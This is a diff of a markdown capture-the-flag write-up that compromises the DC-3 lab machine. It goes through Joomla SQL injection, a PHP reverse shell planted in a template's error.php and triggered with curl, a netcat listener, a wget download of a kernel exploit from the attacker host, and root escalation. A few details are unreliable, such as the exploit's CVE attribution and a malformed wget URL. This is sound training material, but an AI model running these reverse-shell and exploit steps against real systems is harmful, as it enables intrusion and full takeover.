@@ -18,9 +18,11 @@ This command performs several critical functions: the `-v` flag enables verbose 
 
 The scan revealed a single open port: TCP/80 hosting Apache httpd version 2.4.18 running on Ubuntu. The HTTP server identification is critical because it establishes the attack surface and narrows the potential exploitation vectors. Apache 2.4.18 on Ubuntu is identifiable to specific Ubuntu releases, which assists in determining available kernel vulnerabilities for later privilege escalation attempts.
 
-<img width="1920" height="983" alt="image" src="https://github.com/user-attachments/assets/31a07766-23b8-4d55-81fa-0e5d703c95a1" />
+**(VirtualBox_kali_26_06_2026_09_25_59.png)**
 
-This screenshot shows the complete Nmap output including the discovery of port 80, Apache service identification, Joomla version detection, and system uptime information. The output explicitly displays "Apache httpd 2.4.18 (Ubuntu)" and reveals valuable information about the running kernel version and system configuration.
+![Nmap scan results showing Apache 2.4.18, Joomla 3.7.0, port 80](./screenshots/01-nmap-scan.png)
+
+This screenshot displays the complete Nmap output including the discovery of port 80, Apache service identification, Joomla version detection, and system uptime information. The output explicitly displays "Apache httpd 2.4.18 (Ubuntu)" and reveals valuable information about the running kernel version and system configuration.
 
 ### Service Enumeration and Web Directory Discovery
 
@@ -34,7 +36,9 @@ The reasoning for directory enumeration is foundational to web application testi
 
 The enumeration results revealed multiple accessible directories including `/administrator/`, `/bin/`, `/cache/`, `/components/`, `/images/`, `/templates/`, `/language/`, `/layouts/`, `/libraries/`, `/media/`, `/modules/`, `/plugins/`, `/server-status/`, and `/tmp/`. The presence of these directories is highly indicative of a Joomla installation, as each represents a standard component of the Joomla directory structure. More critically, the presence of `/administrator/` indicates an administrative interface, while `/templates/` suggests that template files—which often contain executable code—are stored in accessible locations.
 
-<img width="1920" height="982" alt="image" src="https://github.com/user-attachments/assets/41e7a087-4ea3-4fe6-9125-03bc7a252df0" />
+**(VirtualBox_kali_30_06_2026_12_15_19.png)**
+
+![Gobuster directory enumeration results](./screenshots/02-gobuster-enumeration.png)
 
 This screenshot displays the Gobuster output showing all discovered directories. The critical elements visible include the status codes (301 for redirects, 200 for successful responses), directory sizes, and the URL construction showing http://192.168.56.110 as the base. The extensive directory listing demonstrates that the application structure is completely exposed, which is a significant configuration weakness.
 
@@ -42,7 +46,9 @@ This screenshot displays the Gobuster output showing all discovered directories.
 
 To identify specific vulnerabilities within the discovered Joomla installation, OWASP JoomScan was executed. This specialized security tool is designed specifically for Joomla security assessment and performs comprehensive vulnerability scanning including version detection, component vulnerability checking, and configuration weakness identification.
 
-<img width="1920" height="982" alt="image" src="https://github.com/user-attachments/assets/edf61d8f-1d9e-4d01-a430-57c90f34a718" />
+**(VirtualBox_kali_30_06_2026_12_24_36.png)**
+
+![OWASP JoomScan results showing Joomla 3.7.0](./screenshots/03-joomscan-assessment.png)
 
 This screenshot shows the JoomScan output during execution. The visible text displays the tool initialization, Joomla version detection showing "Joomla 3.7.0", firewall detection results showing "Firewall not detected", and core Joomla vulnerability assessment showing "Target Joomla core is not vulnerable". This output is critical because while the core installation may not have known exploits, the version number (3.7.0) is crucial for identifying component-level vulnerabilities. The scan also reveals configuration details such as readable info/status files and directory listings.
 
@@ -58,24 +64,23 @@ Research into known vulnerabilities affecting Joomla 3.7.0 was conducted using s
 searchsploit "Joomla 3.7.0 com_fields SQL Injection"
 ```
 
-This search identified CVE-2017-8917, a critical SQL injection vulnerability present in the com_fields component. The vulnerability exists because the component fails to adequately sanitize user-supplied input in the field parameter handling mechanism. Specifically, the vulnerability allows an unauthenticated attacker to inject arbitrary SQL code into requests targeting the component, enabling direct query execution against the backend database.
+**(VirtualBox_kali_30_06_2026_12_28_11.png)**
+
+![Searchsploit CVE-2017-8917 results](./screenshots/04-searchsploit-cve.png)
+
+This identified CVE-2017-8917, a critical SQL injection vulnerability present in the `com_fields` component. The vulnerability exists because the component fails to adequately sanitize user-supplied input in the field parameter handling mechanism. Specifically, the vulnerability allows an unauthenticated attacker to inject arbitrary SQL code into requests targeting the component, enabling direct query execution against the backend database.
 
 The reasoning for SQL injection being such a critical vulnerability is that it bypasses the entire authentication mechanism of the application. While normal application usage requires authentication to access sensitive data, SQL injection allows attackers to execute database queries directly, potentially extracting all data within the database, modifying records, or even executing operating system commands depending on database configuration.
 
 ### Database Credential Extraction
 
-<img width="1920" height="982" alt="image" src="https://github.com/user-attachments/assets/8e5a60f7-1054-4e28-8572-a66609fef17f" />
+Exploitation of this vulnerability was achieved using a publicly available exploit obtained through searchsploit. The exploit facilitated direct query execution against the joomladb database, resulting in the extraction of sensitive credentials. The compromised credentials included administrative account information: username 'admin' with associated email 'freddy@norealaddress' and a bcrypt-hashed password token. Additionally, database connection parameters were recovered, revealing root access credentials for the MySQL database at localhost.
 
-This screenshot displays the Manu Joomla SQL Injection exploiter interface and results. The critical information visible includes:
-- A successful SQL injection attempt against the target 192.168.56.110
-- Extracted database credentials showing username "admin"
-- Database name "joomladb"
-- Database version "5.7.25-0ubuntu0.16.0"
-- Database username "root@localhost"
-- A bcrypt password hash: "$2y$10$DfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlIB1Zu"
-- An email address "freddy@norealaddress"
+**(VirtualBox_kali_03_07_2026_09_11_36.png)**
 
-The exploit output demonstrates successful SQL injection exploitation. The extracted username "admin" and password hash are the administrative credentials for the Joomla installation. The bcrypt hashing algorithm used (indicated by the "$2y$" prefix) is a modern, computationally expensive hashing function designed to resist brute force attacks. However, the primary value of obtaining the hash is not necessarily to crack it immediately, but rather to use the username "admin" for targeted login attempts, as many administrators reuse credentials across systems or use predictable variations.
+![SQL Injection exploit results with extracted credentials](./screenshots/05-sql-injection-exploit.png)
+
+This screenshot displays the Manu Joomla SQL Injection exploiter interface and results. The critical information visible includes a successful SQL injection attempt against the target 192.168.56.110 with extracted database credentials showing username "admin", database name "joomladb", database version "5.7.25-0ubuntu0.16.0", database username "root@localhost", a bcrypt password hash: "$2y$10$DfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlIB1Zu", and an email address "freddy@norealaddress". The exploit output demonstrates successful SQL injection exploitation, revealing that the extracted username "admin" and password hash are the administrative credentials for the Joomla installation.
 
 ## Post-Compromise Access: Remote Code Execution
 
@@ -83,7 +88,9 @@ The exploit output demonstrates successful SQL injection exploitation. The extra
 
 With the extracted username "admin" from the SQL injection exploit, access attempts were made to the Joomla administrative control panel at http://192.168.56.110/administrator/. The reasoning for attempting access with the extracted credentials is straightforward: the SQL injection compromised the administrative account credentials, and the Joomla control panel provides a legitimate administrative interface for system management.
 
-<img width="955" height="970" alt="image" src="https://github.com/user-attachments/assets/126a0130-4602-4f65-826f-a84aa879e368" />
+**(VirtualBox_kali_03_07_2026_09_20_03.png)**
+
+![Joomla Control Panel successfully logged in](./screenshots/06-joomla-login.png)
 
 This screenshot displays the successful authentication to the Joomla administrative control panel. The browser URL shows "http://192.168.56.110/administrator/index.php", and the interface displays the Joomla 3.7.0 control panel. Visible elements include the "LOGGED-IN USERS" section showing "admin Administration" with a timestamp of "2026-07-03 09:19", and the "POPULAR ARTICLES" section showing "Welcome to DC-3". The green banner at the top displays post-installation messages, indicating this is a freshly configured system. This confirms that the extracted credentials were valid and active.
 
@@ -93,19 +100,25 @@ Upon successful authentication to the administrative interface, the next objecti
 
 The exploitation strategy involved navigating to System → Templates → Beez3 template management interface. The Beez3 template is Joomla's built-in responsive template, making it a reliable target for modification. The error.php file within this template is specifically designed to handle error conditions and render error messages. Because this file is executed whenever errors occur, injecting PHP code into it creates a reliable code execution vector.
 
-<img width="955" height="970" alt="image" src="https://github.com/user-attachments/assets/20ac968b-d0ee-4086-97bb-2b561b654de0" />
+**(VirtualBox_kali_03_07_2026_09_49_07.png)**
 
-This screenshot shows the Joomla administrative interface with the Templates section visible. The interface displays the "Articles: Edit" dialog showing the "Welcome to DC-3" article. The tabs visible include "Content", "Images and Links", "Options", "Publishing", "Configure Edit Screen", and "Permissions". On the right side, the Status shows "Published", and the Category is "- Uncategorised". This demonstrates navigation to the template editing interface where modifications can be made.
+![Template selection and article editing interface](./screenshots/07-template-articles-edit.png)
+
+This screenshot shows the Joomla administrative interface demonstrating navigation through the system. The interface displays the "Articles: Edit" dialog and various editing options. The visible tabs include "Content", "Images and Links", "Options", "Publishing", "Configure Edit Screen", and "Permissions". On the right side, the Status shows "Published", and the Category is "- Uncategorised". This demonstrates navigation to the template editing interface where modifications can be made.
 
 ### Error.php File Modification
 
-<img width="955" height="970" alt="image" src="https://github.com/user-attachments/assets/9c6c21a2-75d8-4351-98f7-8832b24177f3" />
+**(VirtualBox_kali_03_07_2026_10_01_48.png)**
+
+![Template Beez3 customization interface showing file structure](./screenshots/08-template-customize-interface.png)
 
 This screenshot displays the Joomla template customization interface for the Beez3 template. The left sidebar shows various template components including "css", "html", "images", "javascript", "language", and individual PHP files including "component.php", "error.php", "index.php", "jsstrings.php", and "templateDetails.xml". The main editor panel shows "Editing file 'error.php' in template 'beez3'". The visible PHP code in the editor displays GPL license header and comments, confirming this is the error.php file that will be modified.
 
 The error.php file modification involves injecting PHP code that, when executed, will establish a reverse shell connection to the attacker's machine. A reverse shell reverses the typical client-server relationship: instead of the attacker connecting to a listening port on the target system, the target system initiates an outbound connection to the attacker's machine and executes a shell through that connection.
 
-<img width="955" height="970" alt="image" src="https://github.com/user-attachments/assets/a0ed6362-05b5-4254-9494-f8238176a681" />
+**(VirtualBox_kali_03_07_2026_10_08_02.png)**
+
+![error.php file in editor showing reverse shell configuration](./screenshots/09-error-php-editor.png)
 
 This screenshot shows a continuation of the error.php file editing interface. The visible code displays lines 36-58 of the error.php file, showing sections labeled "// Limitations" and comments regarding proc_open and stream_set_blocking functions. Most critically, visible on line 49 is `$ip = '192.168.56.108';` and line 50 shows `$port = 4444;` with a comment "// CHANGE THIS". These represent the attacker configuration parameters for the reverse shell payload, indicating that IP address 192.168.56.108 (the attacker machine) and port 4444 have been configured as the target for the reverse shell connection.
 
@@ -117,7 +130,9 @@ Following the modification of error.php with PHP reverse shell code, the file wa
 curl http://192.168.56.110/templates/beez3/error.php
 ```
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c1c7c7ad-a9fe-46e5-a52c-89eca8b5370f" />
+**(VirtualBox_kali-1_04_08_2026_10_45_47.png)**
+
+![curl command triggering the reverse shell payload](./screenshots/10-curl-execution.png)
 
 This screenshot shows terminal output with the curl command "curl http://192.168.56.110/templates/beez3/error.php" being executed. This command makes an HTTP request to the error.php file, triggering the execution of the injected PHP code. The execution of this file initiates the reverse shell connection to the attacker's listening netcat session on port 4444.
 
@@ -131,10 +146,6 @@ Following the establishment of reverse shell connectivity as the www-data user, 
 
 System enumeration revealed that the target system was running a kernel vulnerable to a privilege escalation exploit targeting the eBPF (extended Berkeley Packet Filter) subsystem. Specifically, the vulnerability involves a "double put" technique that exploits pointer reuse in the eBPF map file descriptor handling mechanism.
 
-<img width="1920" height="983" alt="image" src="https://github.com/user-attachments/assets/3be77bf1-adfc-495e-a3d8-e390cd4c1134" />
-
-This screenshot displays detailed nmap output including the line "OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16" and uptime information "Uptime guess: 0.023 days (since Fri Jun 26 18:51:24 2026)". This information is valuable for kernel version determination, though for privilege escalation purposes, direct examination of the running kernel version is more reliable.
-
 ### Exploit Acquisition and Compilation
 
 The privilege escalation exploit targeting the eBPF subsystem was obtained from the target system's internal HTTP server. This exploit, commonly identified as ebpf_mapfd_doubleput_exploit or CVE-2016-5195 variants, exploits a vulnerability in how the Linux kernel handles eBPF memory allocation. The exploitation sequence involved:
@@ -147,18 +158,19 @@ cd ebpf_mapfd_doubleput_exploit
 ./doubleput
 ```
 
+**(VirtualBox_kali-1_12_08_2026_10_18_56.png)**
+
+![Exploit download and extraction process](./screenshots/11-exploit-download-unzip.png)
+
+This screenshot shows terminal output displaying the download and extraction process. The visible commands show netcat listener establishment, connection from the target system (192.168.56.110), wget downloading the exploit archive with progress output, successful download completion and timestamp information, unzip extracting the archive, and directory navigation commands showing the transition into the exploit directory. This demonstrates the initial stages of acquiring and preparing the privilege escalation exploit.
+
 The reasoning for each step is critical to understanding the exploitation process. First, `wget` downloads the exploit archive from the internal HTTP server. The download destination is to the current working directory in /tmp on the target system. Second, `unzip` extracts the archive, creating the ebpf_mapfd_doubleput_exploit directory and its contents. Third, `cd` changes to the extracted directory. Finally, `compile.sh` is executed—this is a bash script that invokes the C compiler to compile the exploit source code into a binary executable. The reasoning for requiring compilation is that the exploit is written in C, a compiled language, and must be converted to machine code executable by the target system's CPU.
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/86b4fa39-3573-4ca3-a2d0-2776e4e4dd77" />
+**(VirtualBox_kali-1_12_08_2026_10_19_25.png)**
 
-This screenshot shows terminal output displaying the download and extraction process. The visible commands show:
-- `nc -lvnp 4444` establishing a netcat listener
-- Connection from 192.168.56.110 (the target system)
-- `wget http://192.168.56.108:39772.zip` downloading the exploit archive
-- The wget progress output showing download completion and timestamp information
-- `unzip 39772.zip` extracting the archive
-- Directory navigation commands showing the transition into the exploit directory
-- The beginning of the compilation process showing compilation warnings and the message "doubleput.c: In function" with warning messages about pointer casting
+![Compilation process showing pointer reuse exploitation](./screenshots/12-compilation-process.png)
+
+This screenshot displays the continuation of the compilation process and the beginning of exploit execution. Visible text shows compilation warnings regarding pointer casting operations, the message "starting writev", "woohoo, got pointer reuse" - indicating successful pointer reuse exploitation, "writev returned successfully. if this worked, you'll have a root shell in <60 seconds." - confirming the exploit mechanism functioned as intended, and "suid file detected, launching rootshell..." indicating the next stage of privilege escalation. ASCII art display begins to show.
 
 ### Exploit Execution and Privilege Escalation
 
@@ -168,29 +180,13 @@ Upon successful compilation, the `doubleput` binary was executed directly with r
 ./doubleput
 ```
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/128adf90-559b-4d3d-8934-8ac4aa398be5" />
+**(VirtualBox_kali-1_12_08_2026_10_19_42.png)**
 
-This screenshot displays the continuation of the compilation process and the beginning of exploit execution. Visible text shows:
-- Compilation warnings regarding pointer casting operations
-- The message "starting writev"
-- "woohoo, got pointer reuse" - indicating successful pointer reuse exploitation
-- "writev returned successfully. if this worked, you'll have a root shell in <60 seconds." - confirming the exploit mechanism functioned as intended
-- "suid file detected, launching rootshell..."
-- "we have root privs now..." - confirming successful privilege escalation to root
-- ASCII art display showing "W" repeated in pattern
-- Additional confirmatory messages
+![Privilege escalation confirmation with pointer reuse success](./screenshots/13-root-escalation-success.png)
+
+This screenshot shows the completion of privilege escalation with clear confirmation messages. The text displays continuation of pointer reuse exploitation confirmation, the critical message "writev returned successfully. if this worked, you'll have a root shell in <60 seconds." confirming the exploit mechanism, "suid file detected, launching rootshell...", and most importantly "we have root privs now..." confirming root-level access achievement. Additional detailed error information about file extraction and compilation operations is visible, along with ASCII art representation of characters. The "Congratulations are in order. :-)" message indicates challenge completion.
 
 The "pointer reuse" message is the critical indicator of successful exploitation. The eBPF vulnerability works by manipulating how the kernel manages memory pointers in map file descriptors. By causing the kernel to reuse a pointer that has been freed, the exploit can write arbitrary data to arbitrary memory locations, ultimately gaining control of the execution context and elevating privileges.
-
-**Screenshot placement: Image 14 (Final privilege escalation confirmation)**
-This screenshot shows the completion of privilege escalation with clear confirmation messages. The text displays:
-- Continued pointer reuse exploitation confirmation
-- The critical message "writev returned successfully. if this worked, you'll have a root shell in <60 seconds."
-- "suid file detected, launching rootshell..."
-- "we have root privs now..." confirming root access
-- Detailed error information about file extraction and compilation operations
-- ASCII art representation of "W" characters
-- Most importantly: "Congratulations are in order. :-)" message indicating challenge completion
 
 ### Flag Retrieval and System Compromise Confirmation
 
@@ -200,11 +196,11 @@ With root-level privileges successfully obtained, navigation to the /root direct
 cat /root/the-flag.txt
 ```
 
-**Screenshot placement: Image 15 (Flag display)**
-This screenshot shows the terminal output displaying the flag contents. The flag contains ASCII art in the shape of "W" repeated in pattern, followed by the message:
-"Congratulations are in order. :-) I hope you've enjoyed this challenge as I enjoyed making it. If there are any ways that I can improve these little challenges, please let me know. As per usual, comments and complaints can be sent via Twitter to @DCAU7 Have a great day!!!!"
+**(VirtualBox_kali-1_12_08_2026_10_20_53.png)**
 
-This flag confirms successful exploitation of the DC-3 machine, beginning with reconnaissance, proceeding through SQL injection vulnerability exploitation, achieving remote code execution via template modification, and culminating in privilege escalation through kernel exploit utilization.
+![Flag retrieval and challenge completion confirmation](./screenshots/14-flag-retrieval.png)
+
+This screenshot shows the terminal output displaying the flag contents and final confirmation of system compromise. The visible commands show HTTP server setup on port 80 for payload distribution, successful privilege escalation messages, and the flag content beginning with ASCII art in the shape of letters repeated in pattern. The critical message "Congratulations are in order. :-)" is displayed, followed by "I hope you've enjoyed this challenge as I enjoyed making it. If there are any ways that I can improve these little challenges, please let me know. As per usual, comments and complaints can be sent via Twitter to @DCAU7 Have a great day!!!!" This flag confirms successful exploitation of the DC-3 machine, beginning with reconnaissance, proceeding through SQL injection vulnerability exploitation, achieving remote code execution via template modification, and culminating in privilege escalation through kernel exploit utilization.
 
 ## Attack Timeline Summary
 
